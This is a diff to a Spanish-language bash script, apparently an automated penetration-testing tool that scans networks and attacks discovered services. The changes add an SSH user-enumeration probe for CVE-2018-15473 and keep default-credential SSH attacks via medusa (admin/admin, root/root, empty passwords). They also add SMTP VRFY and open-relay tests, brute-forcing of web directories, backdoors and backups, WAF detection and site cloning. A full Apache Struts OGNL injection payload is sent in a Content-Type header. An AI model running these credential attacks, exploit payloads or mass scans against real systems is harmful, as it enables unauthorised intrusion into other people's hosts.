@@ -5,6 +5,7 @@
 # cracker.sh admin/admin
 # PoC Suite3
 # https://medium.com/tenable-techblog/gpon-home-gateway-rce-threatens-tens-of-thousands-users-c4a17fd25b97
+# metasploit scanner/http/enum_wayback
 # Identificar redes con  http://www.ip-calc.com/
 # https://github.com/Exploit-install/Routerhunter-2.0
 # Sacar herramientas de https://github.com/1N3/Sn1per https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest https://github.com/skavngr/rapidscan
@@ -164,8 +165,10 @@ touch $mass_scan_list
 touch $ping_list
 
 
-echo -e "$OKBLUE Que interfaz usaremos? eth0,tap0, etc ?$RESET"
-read iface
+#echo -e "$OKBLUE Que interfaz usaremos? eth0,tap0, etc ?$RESET"
+#read 
+iface=`ip link | awk -F: '$0 !~ "lo|vir|wl|^[^0-9]"{print $2;getline}' | tail -1`
+echo -e "$OKBLUE Usando la interfaz $iface $RESET"
 
 my_ip=`ifconfig $iface | grep -i mask | awk '{print $2}' | sed 's/addr://g' `
 my_mac=`ifconfig $iface | grep ether | awk '{print $2}'`
@@ -199,7 +202,7 @@ sleep 5
   if [ $FILE != NULL ] ; then        
      echo -e  "[+] Usando  archivo : $FILE " 
      if [ ! -f $prefijo$FILE ]; then
-		echo -e  "$OKRED El archivo no existe ! $RESET" 		
+		echo -e  "$OKRED El archivo no existe ! $RESET"
 		exit
 	 fi	
      
@@ -465,37 +468,23 @@ cat $live_hosts
 # FASE: 2
 echo -e "$OKYELLOW [+] FASE 2: ESCANEO DE PUERTOS,VoIP, etc $RESET"
 ################## Escanear (voip,smb,ports,etc) ##################
+
+########### searching VoIP devices ##########
 echo -e "############# Escaneando #################\n"
 
-echo -e "$OKBLUE Proceder con el escaneo? ENTER $RESET"
-read enter
-
-echo -e "$OKBLUE ¿Estamos escaneado IPs publicas? s/n $RESET"	  
-read internet
-      
-########### searching VoIP devices ##########
-if [ $internet == "n" ]; then 	
-
-  if [ $TYPE = "parcial" ] ; then 	
-	echo -e "$OKBLUE Realizar escaneo VoIP ? s/n $RESET"
-    read resp_voip
-  fi
-  
- #if [[ ( ${TYPE} == "completo" || ${resp_voip} == "s" ) && (${FILE} = NULL )]];then 
-  if [[ ${TYPE} == "completo" || ${resp_voip} == "s" ]];then 
-	echo -e "#################### Buscando dispositivos VoIP: ######################"	  
-	
+if test -f "subdominios.txt"; 
+then
+	internet="s"
+    echo -e "[+] Se detecto que estamos escaneando IPs públicas."	  
+else
+    echo -e "#################### Buscando dispositivos VoIP: ######################"	  
+	internet="n"
 	for subnet in $(cat .datos/subnets.txt); do
 	  echo -e "[+] Escaneando $subnet.0/24"	  
 	  svmap $subnet".0/24" > .enumeracion/$subnet-voip.txt 2>/dev/null 
     done;	
-  fi
-fi  
- #####################
-  
+fi    
  
-  
-   
 	
 #####################
   
@@ -726,7 +715,7 @@ if [[ $TYPE = "completo" ]] || [ $tcp_escaneando == "s" ]; then
 	## MAIL																	del newline       add port
 	grep ' 25/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:25\n"' | sort | uniq >> ../.servicios/smtp.txt
 	grep ' 587/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:587\n"' | sort | uniq >> ../.servicios/smtp.txt
-	grep ' 465/open' nmap-tcp.grep | awk '{print $2}'| perl -ne '$_ =~ s/\n//g; print "$_:465\n"'  | sort | uniq >> ../.servicios/smtp.txt	
+	grep ' 465/open' nmap-tcp.grep | awk '{print $2}'| perl -ne '$_ =~ s/\n//g; print "$_:465\n"'  | sort | uniq >> ../.servicios/smtp.txt
 	grep ' 110/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:110\n"' | sort | uniq >> ../.servicios/pop.txt 
 	grep ' 143/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:143\n"' | sort | uniq >> ../.servicios/imap.txt 
 	grep ' 106/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:106\n"' | sort | uniq >> ../.servicios/pop3pw.txt 
@@ -869,7 +858,13 @@ if [ -f .servicios/smtp.txt ]
 						
 			########## VRFY #######
 			echo -e "\t[+] Comprobando comando vrfy"
-			vrfy-test.py $ip $port $DOMAIN > logs/vulnerabilidades/$ip-$port-vrfy.txt 
+			echo "vrfy-test.py $ip $port $DOMAIN " >> logs/vulnerabilidades/$ip-$port-vrfy.txt
+			vrfy-test.py $ip $port $DOMAIN >> logs/vulnerabilidades/$ip-$port-vrfy.txt #prueba usuario@dominio.com
+			echo "" >> logs/vulnerabilidades/$ip-$port-vrfy.txt
+			
+			echo "vrfy-test2.py $ip $port $DOMAIN " >> logs/vulnerabilidades/$ip-$port-vrfy.txt
+			vrfy-test2.py $ip $port $DOMAIN >> logs/vulnerabilidades/$ip-$port-vrfy.txt #prueba usuario
+			
 			egrep -iq "User unknown" logs/vulnerabilidades/$ip-$port-vrfy.txt 
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then			
@@ -889,7 +884,7 @@ if [ -f .servicios/smtp.txt ]
 			open-relay.py $ip $port $DOMAIN > logs/vulnerabilidades/$ip-$port-openrelay.txt 2>/dev/null 
 			sleep 5							
 			
-			egrep -iq "JunkMail rejected|REGISTER IN BLACK" logs/vulnerabilidades/$ip-$port-openrelay.txt 
+			egrep -iq "JunkMail rejected|REGISTER IN BLACK|Client host rejected" logs/vulnerabilidades/$ip-$port-openrelay.txt 
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then			
 				echo -e "\t$OKRED[!] No se pudo completar la prueba (Nuestra IP esta en lista negra)$RESET"
@@ -1225,13 +1220,17 @@ then
 		#SSHBypass
 		grep --color=never "libssh" .enumeracion/$ip-$port-banner.txt > .vulnerabilidades/$ip-$port-SSHBypass.txt 
 		
-		echo -e "\t[+] Probando passwords"	
-		medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
-		medusa -h $ip -u admin -e n -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
-		medusa -h $ip -u root -p root -M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
-		medusa -h $ip -u root -e n-M ssh >> logs/vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null
+		echo -e "\t[+] Probando vulnerabilidad CVE-2018-15473"	
+		enumeracionUsuariosSSH.py --username root --port $port $ip > logs/vulnerabilidades/$ip-$port-CVE15473.txt 2>/dev/null
+		grep "is a valid" logs/vulnerabilidades/$ip-$port-CVE15473.txt  > .vulnerabilidades/$ip-$port-CVE15473.txt
 		
-		grep --color=never SUCCESS logs/vulnerabilidades/$ip-22-passwordDefecto.txt > .vulnerabilidades/$ip-22-passwordDefecto.txt 2>/dev/null					
+		echo -e "\t[+] Probando passwords"	
+		medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/$ip-$port-passwordDefecto.txt 2>/dev/null
+		medusa -h $ip -u admin -e n -M ssh >> logs/vulnerabilidades/$ip-$port-passwordDefecto.txt 2>/dev/null
+		medusa -h $ip -u root -p root -M ssh >> logs/vulnerabilidades/$ip-$port-passwordDefecto.txt 2>/dev/null
+		medusa -h $ip -u root -e n -M ssh >> logs/vulnerabilidades/$ip-$port-passwordDefecto.txt 2>/dev/null
+		
+		grep --color=never SUCCESS logs/vulnerabilidades/$ip-$port-passwordDefecto.txt > .vulnerabilidades/$ip-$port-passwordDefecto.txt 2>/dev/null					
 		echo ""
  	done <.servicios/ssh.txt
 		
@@ -1616,7 +1615,7 @@ then
 		while true; do
 			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
 			perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 
-			if [[ $free_ram -gt $min_ram && $perl_instancias -lt 80  ]];then 											
+			if [[ $free_ram -gt $min_ram && $perl_instancias -lt 20  ]];then 											
 				echo -e "[+] Escaneando $ip:$port"	
 				echo -e "\t[+] Revisando server-status"
 				curl --max-time 2 http://$ip:$port/server-status 2>/dev/null | grep --color=never nowrap | sed 's/<\/td>//g' | sed 's/<td nowrap>/;/g' | sed 's/<\/td><td>//g'| sed 's/<\/td><\/tr>//g' | sed 's/amp;//g' > .enumeracion/$ip-$port-serverStatus.txt 
@@ -1665,9 +1664,10 @@ then
 		while true; do
 			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
 			perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 
-			if [[ $free_ram -gt $min_ram && $perl_instancias -lt 80  ]];then 
+			if [[ $free_ram -gt $min_ram && $perl_instancias -lt 20  ]];then 
 			
 				#################  Realizar el escaneo por dominio  ##############
+				echo "free_ram $free_ram    perl_instancias $perl_instancias"
 				if grep -q "," "$prefijo$FILE" 2>/dev/null; then
 					lista_subdominios=`grep $ip -a $prefijo$FILE | cut -d "," -f2`
 					for subdominio in $lista_subdominios; do													
@@ -1676,27 +1676,48 @@ then
 						greprc=$?	
 						if [[ $greprc -eq 1 ]];then # no redirecciona a otro dominio o es error de proxy
 							#test debug
+							echo -e "\t[+] Test modo debug "
 							curl --max-time 2 http://$subdominio:$port/nonexist123  > logs/enumeracion/$subdominio-$port-debugHabilitado.txt 2>/dev/null
 							egrep -i  --color=never "Django|laravel" logs/enumeracion/$subdominio-$port-debugHabilitado.txt > .enumeracion/$subdominio-$port-debugHabilitado.txt
+														
+							echo -e "\t[+] Lanzando wafw00f "
+							wafw00f $subdominio > logs/enumeracion/$subdominio-web-wafw00f.txt
+							grep "is behind" logs/enumeracion/$subdominio-web-wafw00f.txt > .enumeracion/$subdominio-web-wafw00f.txt
+							echo ""
+	
+							echo -e "\t[+] Detectando si hay balanceador de carga  "							
+							lbd $subdominio > logs/enumeracion/$subdominio-web-balanceador.txt
+							grep "does Load-balancing" logs/enumeracion/$subdominio-web-balanceador.txt > .enumeracion/$subdominio-web-balanceador.txt
+							echo ""
+
   							###  if the server is apache ######
-							egrep -i "apache|nginx" .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga" # solo el segundo egrep poner "-q"
+							egrep -i "apache|nginx" .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS" # solo el segundo egrep poner "-q"
 							greprc=$?
 							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
 												
-								echo -e "\t[+] Revisando directorios y archivos comunes ($subdominio - Apache)"
-								web-buster.pl -t $subdominio  -p $port -h 3 -d / -m admin -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
+								echo -e "\t[+] Revisando directorios comunes ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio  -p $port -h 2 -d / -m directorios -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
 								sleep 2
-								web-buster.pl -t $subdominio  -p $port -h 3 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
+								echo -e "\t[+] Revisando paneles administrativos ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio  -p $port -h 2 -d / -m admin -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backupApache -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
+								echo -e "\t[+] Revisando archivos comunes de servidor ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio  -p $port -h 2 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m cgi -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt; cat .servicios/cgi.txt >> .enumeracion/$subdominio-$port-webarchivos.txt
+								echo -e "\t[+] Revisando backups de archivos de configuración ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backupApache -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m archivosPeligrosos -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$subdominio-$port-archivosPeligrosos.txt  &
+								echo -e "\t[+] Revisando archivos CGI ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m cgi -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt; cat .servicios/cgi.txt >> .enumeracion/$subdominio-$port-webarchivos.txt
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backdoorApache -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$subdominio-$port-backdoor.txt  &
+								echo -e "\t[+] Revisando archivos peligrosos ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m archivosPeligrosos -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$subdominio-$port-archivosPeligrosos.txt  
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 2 -d / -m phpinfo -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/$subdominio-$port-phpinfo.txt 2>/dev/null &
+								echo -e "\t[+] Revisando la existencia de backdoors ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backdoorApache -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/$subdominio-$port-backdoor.txt  
+								sleep 2
+								echo -e "\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($subdominio - Apache/nginx)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m divulgacionInformacion -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/$subdominio-$port-divulgacionInformacion.txt 2>/dev/null 
 								
 																
 								echo -e "\t[+] Revisando vulnerabilidad slowloris ($subdominio)"
@@ -1707,21 +1728,29 @@ then
 							####################################	
 							
 							#######  if the server is IIS ######
-							grep -i IIS .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga"  # no redirecciona
+							grep -i IIS .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS"  # no redirecciona
 							greprc=$?
 							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes							
-								echo -e "\t[+] Revisando directorios y archivos comunes (IIS)"					
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m admin -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
+								echo -e "\t[+] Revisando directorios comunes ($subdominio - IIS)"								
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m directorios -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &	
+								echo -e "\t[+] Revisando paneles administrativos ($subdominio - IIS)"								
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m admin -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m sharepoint -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &	
+								echo -e "\t[+] Revisando archivos comunes de servidor ($subdominio - IIS)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m webservices -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
+								echo -e "\t[+] Revisando archivos comunes de sharepoint ($subdominio - IIS)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m sharepoint -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backdoorsIIS -s 0 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$subdominio-$port-backdoor.txt  &
+								echo -e "\t[+] Revisando archivos comunes de webservices ($subdominio - IIS)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m webservices -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  
 								sleep 2
-								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backupIIS -s 0 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$subdominio-$port-backdoor.txt  &
+								echo -e "\t[+] Revisando la existencia de backdoors ($subdominio - IIS)"								
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backdoorsIIS -s 0 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$subdominio-$port-backdoor.txt  
+								sleep 2
+								echo -e "\t[+] Revisando backups de archivos de configuración ($subdominio - IIS)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backupIIS -s 0 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$subdominio-$port-backdoor.txt  
 								sleep 2										   
 							fi
 										
@@ -1737,9 +1766,14 @@ then
 								curl --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "http://$subdominio:$port/" > logs/vulnerabilidades/$subdominio-$port-apacheStruts.txt 2>/dev/null
 								grep -i "Apache Struts Vulnerable" logs/vulnerabilidades/$subdominio-$port-apacheStruts.txt > .vulnerabilidades/$subdominio-$port-apacheStruts.txt
 						  		  
-								echo -e "\t[+] Revisando directorios y archivos comunes (JSP)"
-								web-buster.pl -t $subdominio -p $port -h 5 -d / -m tomcat -s 0 -q 1 | egrep --color=never "^200|^301|^401|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &			
-								web-buster.pl -t $subdominio -p $port -h 5 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &										
+								echo -e "\t[+] Revisando directorios comunes ($subdominio - Tomcat)"								
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m directorios -s 0 -q 1 | egrep --color=never "^200|^301|^401|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &			
+								sleep 2;
+								echo -e "\t[+] Revisando archivos comunes de tomcat ($subdominio - Tomcat)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m tomcat -s 0 -q 1 | egrep --color=never "^200|^301|^401|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  
+								sleep 2;
+								echo -e "\t[+] Revisando archivos comunes de servidor ($subdominio - Tomcat)"
+								web-buster.pl -t $subdominio -p $port -h 2 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  
 								sleep 1										
 							fi
 										
@@ -1778,7 +1812,7 @@ then
 							#######  clone site (domain) ####### 									
 							cd webClone
 								echo -e "\t\t[+] Clonando sitio ($subdominio)"	
-								wget -mirror --convert-links -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp --exclude-directories /calendar,/noticias,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate http://$subdominio
+								wget -mirror --convert-links -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp,ttf,svg,woff2,css,ico --exclude-directories /calendar,/noticias,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate http://$subdominio
 								rm index.html.orig 2>/dev/null
 							cd ..										
 							###################################							
@@ -1789,69 +1823,29 @@ then
 					
 					#######  extract URLs ####### 
 					cd webClone
+						echo ""
 						echo -e "\t\t[+] Extrayendo URL de los sitios clonados"	
 						grep --color=never -irao "http://[^ ]*"  * | cut -d ":" -f3 | grep --color=never -ia "$DOMAIN" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > http.txt 				     
 						lines=`wc -l http.txt  | cut -d " " -f1`
 						perl -E "say \"http://\n\" x $lines" > prefijo.txt # file with the domain (n times)
 						paste -d '' prefijo.txt http.txt >> ../logs/enumeracion/$DOMAIN-web-wget2.txt # adicionar http:// a cada linea
-						rm http.txt
+						rm http.txt 2>/dev/null
 					
 						grep --color=never -irao "https://[^ ]*"  * | cut -d ":" -f3 | grep --color=never -ia "$DOMAIN" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > https.txt 
 						lines=`wc -l https.txt  | cut -d " " -f1`
 						perl -E "say \"https://\n\" x $lines" > prefijo.txt # file with the domain (n times)
 						paste -d '' prefijo.txt https.txt >> ../logs/enumeracion/$DOMAIN-web-wget2.txt  # adicionar https:// a cada linea
-						rm https.txt
-						
-						# buscar archivos sin extension
-						find . -type f ! \( -iname \*.pdf -o -iname \*.html -o -iname \*.htm -o -iname \*.doc -o -iname \*.docx -o -iname \*.xls -o -iname \*.ppt -o -iname \*.pptx -o -iname \*.xlsx -o -iname \*.js -o -iname \*.css -o -iname \*.orig \) > archivos-sin-extension.txt
-						contador=1
-						mkdir documentos_renombrados
-						for archivo in `cat archivos-sin-extension.txt`;
-						do 		
-							tipo_archivo=`file $archivo`
-							# tipos de archivos : https://docs.microsoft.com/en-us/previous-versions//cc179224(v=technet.10)
-							if [[ ${tipo_archivo} == *"PDF"*  ]];then 													
-								mv $archivo documentos_renombrados/$contador.pdf 
-							fi		
-	 
-							if [[ ${tipo_archivo} == *"Creating Application: Microsoft Word"*  ]];then 												
-								mv $archivo documentos_renombrados/$contador.doc 
-							fi		
-		
-							if [[ ${tipo_archivo} == *"Microsoft Word 2007"*  ]];then 												
-								mv $archivo documentos_renombrados/$contador.docx 
-							fi		
-	 
-							if [[ ${tipo_archivo} == *"Creating Application: Microsoft Excel"*  ]];then 				
-								mv $archivo documentos_renombrados/$contador.xls 
-							fi				 
-	 
-							if [[ ${tipo_archivo} == *"Office Excel 2007"*  ]];then 							
-								mv $archivo documentos_renombrados/$contador.xlsx 
-							fi			 	
-	 		 
-							if [[ ${tipo_archivo} == *"Creating Application: Microsoft PowerPoint"*  ]];then 								
-								mv $archivo documentos_renombrados/$contador.ppt 
-							fi			 
-	 		 
-							if [[ ${tipo_archivo} == *"Office PowerPoint 2007"*  ]];then 				
-								mv $archivo documentos_renombrados/$contador.pptx 
-							fi		
-	 
-							if [[ ${tipo_archivo} == *"RAR archive data"*  ]];then 						
-								mv $archivo documentos_renombrados/$contador.rar 
-							fi		
-							let "contador=contador+1"	 
-						done # fin revisar archivos sin extension
-
+						rm https.txt 2>/dev/null						
 					cd ../
 					###################################				    
-					#done 					
+					#done 									
 				fi #rev por dominio
 				################################
 				
 				
 				#################  Realizar el escaneo por IP  ##############				
+				
+				#Probar si el debug esta habilitado
 				curl --max-time 2 http://$ip:$port/nonexist123  > logs/enumeracion/$ip-$port-debugHabilitado.txt 2>/dev/null
 				egrep -i  --color=never "Django|laravel" logs/enumeracion/$ip-$port-debugHabilitado.txt > .enumeracion/$ip-$port-debugHabilitado.txt
 								
@@ -1887,24 +1881,34 @@ then
 					
 					
 				#######  if the server is IIS ######
-				grep -i IIS .enumeracion/$ip-$port-webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga"  # no redirecciona
+				grep -i IIS .enumeracion/$ip-$port-webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS"  # no redirecciona
 				greprc=$?
 				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes
 				   #nmap -n -p $port --script http-vuln-cve2015-1635 $ip > logs/vulnerabilidades/$ip-$port-HTTPsys.txt 2>/dev/null 
-					nmap -n -p $port --script=http-iis-webdav-vuln $ip > logs/vulnerabilidades/$ip-$port-webdav.txt 2>/dev/null 
+				    echo "nmap -n -p $port --script=http-iis-webdav-vuln $ip" > logs/vulnerabilidades/$ip-$port-webdav.txt 2>/dev/null 
+					nmap -n -p $port --script=http-iis-webdav-vuln $ip >> logs/vulnerabilidades/$ip-$port-webdav.txt 2>/dev/null 					
 					grep "|" logs/vulnerabilidades/$ip-$port-webdav.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/$ip-$port-webdav.txt 					
-					echo -e "\t[+] Revisando directorios y archivos comunes (IIS)"					
-					web-buster.pl -t $ip -p $port -h 3 -d / -m admin -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
+					
+					echo -e "\t[+] Revisando directorios comunes ($ip -IIS)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m directorios -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &	
+					echo -e "\t[+] Revisando paneles administrativos ($ip -IIS)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m admin -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m sharepoint -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &	
+					echo -e "\t[+] Revisando archivos comunes de servidor ($ip -IIS)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m webservices -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
+					echo -e "\t[+] Revisando archivos comunes de sharepoint ($ip -IIS)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m sharepoint -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m backdoorsIIS -s 0 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$ip-$port-backdoor.txt  &
+					echo -e "\t[+] Revisando archivos comunes de webservices ($ip -IIS)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m webservices -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  
 					sleep 2
-					web-buster.pl -t $ip -p $port -h 3 -d / -m backupIIS -s 0 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$ip-$port-backdoor.txt  &
+					echo -e "\t[+] Revisando la existencia de backdoors ($ip -IIS)"	
+					web-buster.pl -t $ip -p $port -h 2 -d / -m backdoorsIIS -s 0 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$ip-$port-backdoor.txt  
+					sleep 2
+					echo -e "\t[+] Revisando la existencia de backups de archivos de configuración ($ip -IIS)"	
+					web-buster.pl -t $ip -p $port -h 2 -d / -m backupIIS -s 0 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$ip-$port-backdoor.txt  
 					sleep 2										   
 				fi
 										
@@ -1917,12 +1921,17 @@ then
 				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es Java y no se enumero antes
 				
 					echo -e "\t[+] Revisando Apache struts"					
